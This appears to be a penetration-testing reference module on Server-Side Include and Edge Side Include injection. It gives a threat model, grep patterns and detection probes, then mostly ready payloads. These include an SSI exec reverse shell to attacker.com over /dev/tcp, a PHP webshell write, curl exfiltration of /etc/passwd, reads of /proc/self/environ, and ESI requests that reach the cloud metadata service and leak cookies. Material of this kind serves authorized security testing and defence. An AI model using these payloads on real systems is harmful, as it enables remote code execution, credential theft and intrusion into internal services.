# VULN MODULE — SSI / ESI Injection
# Asset: webapp
# CWE-97 / CWE-16 | Report prefix: WEB-SSI / WEB-ESI

## THREAT MODEL

### SSI (Server-Side Includes)
SSI directives embedded in HTML are processed by the web server (Apache, Nginx, IIS)
before delivery. If user input reaches a page served with SSI processing enabled,
directives are executed with web server privileges.

### ESI (Edge Side Includes)
ESI tags are processed by HTTP intermediaries (CDN edge nodes, reverse proxies, caches).
If user input is reflected into a cached response body, ESI tags may be injected and
executed by the intermediary — an entirely separate execution context from the origin.

Attack surface:
- Any response reflected into a page where SSI/ESI is processed
- URL parameters, headers, cookies reflected in HTML
- Shared caches, CDN edge caches (Varnish, Fastly, Akamai)
- Search result pages, error pages, user profile displays

## VULNERABILITY CLASSES

1. SSI File Read       CWE-22   — include directive reads arbitrary files
2. SSI RCE             CWE-78   — exec directive runs OS commands
3. ESI Injection       CWE-94   — ESI tags processed by intermediary
4. ESI SSRF            CWE-918  — esi:include fetches internal service
5. ESI Header Leakage  CWE-200  — esi:vars exposes internal headers/vars

## WHITEBOX PATTERNS

```bash
# Apache SSI configuration
grep -rn "Options.*Includes\|AddOutputFilter.*INCLUDES\|XBitHack" \
  --include="*.conf" --include="*.htaccess"
# SSILegacyExprParser = old syntax permitted

# Nginx SSI
grep -rn "ssi on\|ssi_silent_errors" --include="*.conf"

# ESI processing in code
grep -rn "esi\b\|EdgeSideInclude\|x-esi" \
  --include="*.conf" --include="*.vcl" --include="*.json" -i

# User input reflected into HTML templates
grep -rn "echo\|print\|printf\|render\|output" --include="*.php" -A3 | \
  grep -i "param\|query\|input\|request"
```

## SSI DETECTION — INITIAL PROBE

Inject into any reflected parameter:

```
<!--#echo var="DATE_LOCAL" -->
```

If the current date/time appears in the response → SSI injection confirmed.

## SSI PAYLOADS

| Directive | Purpose | Payload |
|---|---|---|
| echo | Print server variable | `<!--#echo var="DOCUMENT_ROOT" -->` |
| echo | Print all headers | `<!--#echo var="HTTP_HOST" -->` |
| include file | Read local file | `<!--#include file="/etc/passwd" -->` |
| include virtual | Read file via virtual path | `<!--#include virtual="/etc/passwd" -->` |
| exec cmd | OS command execution | `<!--#exec cmd="id" -->` |
| exec cmd | Reverse shell | `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" -->` |
| exec cgi | Execute CGI script | `<!--#exec cgi="/cgi-bin/cmd.cgi" -->` |
| printenv | Dump all variables | `<!--#printenv -->` |

### Additional file read techniques

```html
<!--#include file="../../etc/passwd" -->
<!--#include virtual="/.../../etc/passwd" -->
<!--#include file="/proc/self/environ" -->
<!--#include file="/etc/nginx/nginx.conf" -->
```

### RCE escalation

```bash
# List web root
<!--#exec cmd="ls /var/www/html/" -->

# Write PHP webshell
<!--#exec cmd="echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php" -->

# Exfiltrate /etc/passwd via HTTP
<!--#exec cmd="curl -d @/etc/passwd http://attacker.com/collect" -->
```

## ESI INJECTION PAYLOADS

### Basic detection
```xml
<esi:include src="http://attacker.com/esi_probe"/>
```
If your HTTP listener receives a request → ESI processing confirmed.

### SSRF to internal services
```xml
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://internal-api.company.local/admin"/>
<esi:include src="http://localhost:8080/actuator/env"/>
```

### Header and variable leakage
```xml
<esi:vars>
  $add_header('X-Leaked', $(HTTP_COOKIE))
  $add_header('X-Host', $(SERVER_NAME))
</esi:vars>

<!-- Varnish VCL variable access -->
<esi:vars>$(QUERY_STRING)</esi:vars>
```

### XSS via ESI (reflected into page)
```xml
<esi:include src="http://attacker.com/xss.html"/>
<!-- xss.html contains: <script>alert(document.domain)</script> -->
```

### Bypass: ESI inside HTML comment (Akamai)
```html
<!--esi <esi:include src="http://attacker.com/probe"/> -->
```

### ESI injection via HTTP headers (when headers are reflected)
```
X-Forwarded-For: <esi:include src="http://attacker.com"/>
User-Agent: <esi:include src="http://169.254.169.254/latest/meta-data"/>
```

## ESI SOFTWARE MATRIX

| Product | ESI Support | Notes |
|---|---|---|
| Squid3 | Partial | esi:include, esi:remove — no vars |
| Varnish | Partial | SSRF via esi:include, vars with vcl |
| Fastly | Partial | esi:include, esi:comment |
| Akamai ETS | Full | Supports most ESI 1.0 spec including vars |
| Node.js (node-esi) | Partial | Library-dependent |
| Nginx (ngx_http_esi_module) | Partial | Non-default, rare |

## TOOLS

```bash
# Manual injection via curl:
curl -s "https://target.com/search?q=<!--#exec cmd='id'-->"

# Gopherus — for SSRF → ESI chaining
# https://github.com/tarunkant/Gopherus

# ESI Injection scanner (Burp extension: ESI Injection)
# Also test via X-Forwarded-For, User-Agent, Referer header reflection
```
